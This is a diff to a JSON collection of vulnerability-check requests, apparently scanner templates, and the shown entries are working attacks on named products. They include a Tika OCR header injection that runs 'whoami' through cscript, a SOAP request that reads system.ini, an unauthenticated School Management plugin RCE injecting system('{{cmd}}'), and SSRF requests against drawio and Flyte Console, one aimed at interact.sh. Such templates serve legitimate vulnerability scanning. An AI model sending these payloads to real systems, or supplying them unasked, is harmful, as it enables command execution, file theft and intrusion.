@@ -6330,11 +6330,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -11098,9 +11098,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -17515,6 +17515,34 @@
       ]
     },
     {
+      "id": "CVE-2022-1609",
+      "info": {
+        "name": "The School Management < 9.9.7 - Unauthenticated RCE via REST api",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-json/am-member/license HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nblowfish=1&blowf=system('{{cmd}}');\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1713",
+      "info": {
+        "name": "SSRF on /proxy in GitHub repository jgraph/drawio",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /proxy?url=http%3a//0:8080/ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21371",
       "info": {
         "name": "Oracle WebLogic Server Local File Inclusion",
@@ -17830,6 +17858,21 @@
           "path": [
             "{{BaseURL}}/admin/airflow/code?root=&dag_id=example_passing_params_via_test_command",
             "{{BaseURL}}/code?dag_id=example_passing_params_via_test_command"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-24856",
+      "info": {
+        "name": "Flyte Console < 0.52.0 - Server Side Request Forgery (SSRF)",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cors_proxy/https://www.interact.sh"
           ]
         }
       ]
